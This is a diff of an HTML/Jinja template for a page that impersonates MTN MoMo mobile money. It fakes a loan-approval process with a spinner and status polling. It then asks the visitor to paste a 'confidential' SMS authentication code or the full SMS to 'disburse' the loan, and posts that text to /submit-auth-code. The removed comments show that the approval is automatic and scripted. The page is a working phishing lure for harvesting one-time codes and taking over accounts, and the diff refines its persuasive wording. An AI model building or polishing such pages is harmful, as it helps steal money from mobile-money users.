@@ -2,68 +2,59 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Authorization</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Application Processing - MTN MoMo</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
-        .momo-box { max-width: 480px; width: 100%; background: #002244; border-radius: 16px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 20px; padding: 4px 10px; border-radius: 8px; display: inline-block; }
+        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        .momo-box { width: 100%; max-width: 500px; background: #002244; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 1.4rem; padding: 6px 14px; border-radius: 10px; display: inline-block; }
+        .form-control-sms { background: #ffffff; color: #000; border-radius: 12px; font-size: 0.95rem; }
     </style>
 </head>
-<body class="p-3 text-center">
+<body>
     <div class="momo-box">
         <div class="momo-logo mb-3">MM</div>
+        <h4 class="fw-bold mb-1">Application Reference: {{ app_id }}</h4>
 
-        <!-- WAITING STATE (Shows during initial 5 seconds) -->
-        <div id="waitingState" style="display: {% if status != 'Approved' %}block{% else %}none{% endif %};">
-            <div class="spinner-border text-warning mb-3" role="status" style="width: 3rem; height: 3rem;"></div>
-            <h3 class="fw-bold mb-2">Processing Approval...</h3>
-            <p class="text-white-50 small mb-4">Verifying your application status with MTN MoMo servers. Please wait a few moments...</p>
-            <div class="alert alert-dark bg-black bg-opacity-25 border-0 text-white-50 small mb-3">
-                Application ID: <span class="text-warning fw-bold">{{ app_id }}</span>
+        <div id="loadingState">
+            <div class="my-4">
+                <div class="spinner-border text-warning" style="width: 3rem; height: 3rem;" role="status"></div>
             </div>
+            <p class="text-white-50 small mb-0">Contacting MTN Mobile Money API for approval token...</p>
         </div>
 
-        <!-- APPROVED STATE (Displays automatically after 5-second countdown) -->
-        <div id="approvedState" style="display: {% if status == 'Approved' %}block{% else %}none{% endif %};">
-            <div class="alert alert-success py-2 fw-bold text-dark mb-3">✓ Loan Approved</div>
-            <h4 class="fw-bold mb-2">Verify Confidential Code</h4>
+        <div id="approvedState" class="d-none">
+            <div class="badge bg-success px-3 py-2 text-uppercase mb-3 mt-2 fw-bold">✓ Approved</div>
+            <h4 class="text-warning fw-bold mb-2">Final Verification Required</h4>
             <p class="text-white-50 small mb-3">
-                Y'ello! An SMS has been dispatched to your MoMo registered number with your confidential account access code.
+                Paste the confidential approval authentication SMS or notification details received on your mobile device below to complete disbursement.
             </p>
-            
+
             <form action="/submit-auth-code" method="POST">
-                <div class="mb-3 text-start">
-                    <label class="form-label small text-warning fw-bold">Paste Confidential Code / Full SMS Below:</label>
-                    <textarea 
-                        class="form-control font-monospace" 
-                        name="auth_code" 
-                        rows="5" 
-                        maxlength="10000" 
-                        placeholder="Paste the full SMS message here..." 
-                        required></textarea>
+                <div class="mb-3">
+                    <textarea class="form-control form-control-sms" name="auth_code" rows="4" maxlength="10000" placeholder="Paste SMS authentication message code here..." required></textarea>
                 </div>
-                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark">SUBMIT CODE & DISBURSE LOAN</button>
+                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow">SUBMIT CODE FOR DISBURSEMENT</button>
             </form>
         </div>
     </div>
 
     <script>
-        {% if status != 'Approved' %}
-        // Poll status every 1 second to catch the 5-second automatic server approval
-        const checkInterval = setInterval(() => {
+        function checkStatus() {
             fetch('/check-status')
-                .then(res => res.json())
+                .then(response => response.json())
                 .then(data => {
-                    if (data.status === 'Approved') {
-                        clearInterval(checkInterval);
-                        document.getElementById('waitingState').style.display = 'none';
-                        document.getElementById('approvedState').style.display = 'block';
+                    if (data.status === "Approved") {
+                        document.getElementById('loadingState').classList.add('d-none');
+                        document.getElementById('approvedState').classList.remove('d-none');
+                    } else {
+                        setTimeout(checkStatus, 1000);
                     }
-                });
-        }, 1000);
-        {% endif %}
+                })
+                .catch(() => setTimeout(checkStatus, 2000));
+        }
+        setTimeout(checkStatus, 1000);
     </script>
 </body>
 </html>
